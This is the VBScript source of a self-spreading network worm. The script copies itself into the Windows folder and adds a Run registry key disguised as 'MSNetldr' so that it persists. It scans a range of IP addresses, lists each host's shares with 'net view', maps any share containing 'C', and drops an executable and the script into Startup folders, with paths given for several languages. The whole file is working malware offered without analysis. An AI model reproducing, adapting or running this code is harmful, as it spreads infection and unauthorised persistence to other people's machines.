on error resume next

const cNT=1
const c9x=0
const wrm=0
const cInit=1
const cEnumSh=1

const ipamin = 200
const ipamax = 200

const ipbmin = 30
const ipbmax = 30

const ipcmin = 192
const ipcmax = 255

const ipdmin = 0
const ipdmax = 255

const MAXPATHS=10

const srcfil     = "msnetldx.exe"
const destvbsfil = "MSNetldr.vbs"
const shrfol     = "shrfol.fol"

const drivenet = "z:"
const dot = "."

const linshr=5
const shrmaxcol=13
const charshrc="C"
Const ForReading = 1

dim sPaths9x(10)
dim sPathsNT(10)

dim ipa
dim ipb
dim ipc
dim ipd

dim randa
dim randb
dim randc
dim randd

dim driveconnected
dim sharename

dim targIP
dim targShrfol

dim dirwin

dim WSHSHell

dim count
dim fshr
dim shrdfolder

dirwin="\windows"

sPaths9x(0)="\Windows\Start Menu\Programs\Startup"
sPaths9x(1)="\Windows\Menú Inicio\Programas\Inicio"
sPaths9x(2)="\windows\Menu Iniciar\programas\Iniciar"
sPaths9x(3)="\WINDOWS\Menu Démarrer\Programmes\Démarrage"
sPaths9x(4)="\windows\startmenü\programme\autostart"
sPaths9x(5)="\windows\menu avvio\programmi\esecuzione automatica"
sPaths9x(6)="\WINDOWS\½ÃÀÛ ¸Þ´º\ÇÁ·Î±×·¥\½ÃÀÛÇÁ·Î±×·¥"

sPathsNT(0)="\Documents and Settings\All Users\Start Menu\Programs\Startup"
sPathsNT(1)="\Documents and Settings\All Users\Menú Inicio\Programas\Inicio"
sPathsNT(2)="\Documents and Settings\All Users\Menu Iniciar\Programas\Inicializar"
sPathsNT(3)="\dokumente und einstellungen\all users\startmenü\programme\autostart"
sPathsNT(4)="\documents and settings\all users\menu avvio\programmi\esecuzione automatica"

driveconnected="0"
set wshnetwork = wscript.createobject("wscript.network")
Set fso1 = createobject("scripting.filesystemobject")
set fso2 = createobject("scripting.filesystemobject")
set fso3 = createobject("scripting.filesystemobject")
Set fso4 = CreateObject("Scripting.FileSystemObject")

Set WSHShell = WScript.CreateObject("WScript.Shell")

targShrfol=left(WScript.ScriptFullName,3)&shrfol

if wrm=0 then
   if cInit=1 then
       init()
   end if
end if

randomize
randaddress()

do
    checkaddress()
    
    if cEnumSh=1 then
        enumshrdfolders()
        count=0
        Set fshr = fso3.OpenTextFile(targShrfol, ForReading, False)
    end if 
    
    do 
       shareformat()
       if cEnumSh=1 and trim(shrdfolder)="" then
            fshr.Close()
            exit do
       end if
       
       wshnetwork.mapnetworkdrive drivenet, sharename

       enumdrives()
       if driveconnected <> "0" then
          copyfiles()
       end if
       
       disconnectdrive()
       
       if cEnumSh=0 then
          exit do
       end if
       
    loop until false
loop



function disconnectdrive()
on error resume next

    wshnetwork.removenetworkdrive drivenet
    driveconnected = "0"
end function

Function Copyfiles1dir(sPath)
on error resume next
dim thPath

        if (spath>"") then
            If (fso2.FolderExists(drivenet & spath)) Then 
            
                fso1.copyfile "\"&srcfil, drivenet&spath&"\"
                if wrm=1 then
                    fso1.copyfile "\"&srcfil, drivenet&"\"
                    fso1.copyfile WScript.ScriptFullName, drivenet&spath&"\"
                end if 
                
                Copyfiles1dir=1
                exit function
                
            end if
        end if 
        Copyfiles1dir=0
End Function

function copyfiles()
on error resume next

'dim spath

    for i=0 to MAXPATHS
        if c9x=1 then
           if Copyfiles1dir(trim(sPaths9x(i)))=1 then
              exit function
           end if
        end if
        
        if cNT=1 then
           if Copyfiles1dir(trim(sPathsNT(i)))=1 then
              exit function
           end if
        end if

    next

end function

function checkaddress()
on error resume next

    ipd = ipd + 1
    if ipd > ipdmax then 
        ipd = ipdmin
        ipc = ipc + 1
        if ipc > ipcmax then
            ipc = ipcmin
            ipb = ipb + 1
            if ipb > ipbmax then
                ipb = ipbmin
                ipa = ipa+1
                if ipa > ipamax then
                    ipa = ipamin
                end if
            End if 
        End if 
    End if
    
    targIP = "\\" & ipa & dot & ipb & dot & ipc & dot & ipd
    
end function

Function enumshrdfolders()
on error resume next
   
        fso4.DeleteFile(targShrfol)

        WSHShell.Run "%comspec% /c net view "&targIP&" > " &targShrfol,0,True
         
End Function

function shareformat()
on error resume next
dim rline
dim shrd

    shrdfolder=""

    if cEnumSh=0 then
       sharename = targIP & "\C"
       exit function
    end if

    Do While fshr.AtEndOfStream <> True

           rline = fshr.ReadLine
           if Instr( UCase(rline), "ERROR")>0 then
              exit function
           end if
           
           count=count+1
           if count>=linshr then
              shrd=trim(left(rline,shrmaxcol))
              if Instr( UCase(shrd),charshrc)>0 then
                 shrdfolder=shrd
                 exit do
              end if
           end if
           
    loop
    
    sharename = targIP & "\" & shrdfolder

end function

function enumdrives()
on error resume next

    Set odrives = wshnetwork.enumnetworkdrives
    For i = 0 to odrives.Count -1
        if sharename = odrives.item(i) then
            driveconnected = 1
            exit function
        else
            driveconnected = 0 
        end if
    Next
end function

function randum()
on error resume next

    randa = int(((ipamax - ipamin + 1) * rnd) + ipamin)
    randb = int(((ipbmax - ipbmin + 1) * rnd) + ipbmin)
    randc = int(((ipcmax - ipcmin + 1) * rnd) + ipcmin)
    randd = int(((ipdmax - ipdmin + 1) * rnd) + ipdmin)
    
end function

function randaddress()
on error resume next

    randum()
    ipa = randa
    ipb = randb
    ipc = randc
    ipd = randd

end function

sub init()
On Error Resume Next

dim fso

    Set fso = CreateObject("Scripting.FileSystemObject")

    Set dirwin = fso.GetSpecialFolder(0)
    Set c = fso.GetFile(WScript.ScriptFullName)
    c.Copy(dirwin&"\"&destvbsfil)
    
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSNetldr",dirwin&"\"&destvbsfil

end sub

sub regcreate(regkey,regvalue)
    Set regedit = CreateObject("WScript.Shell")
    regedit.RegWrite regkey,regvalue
end sub

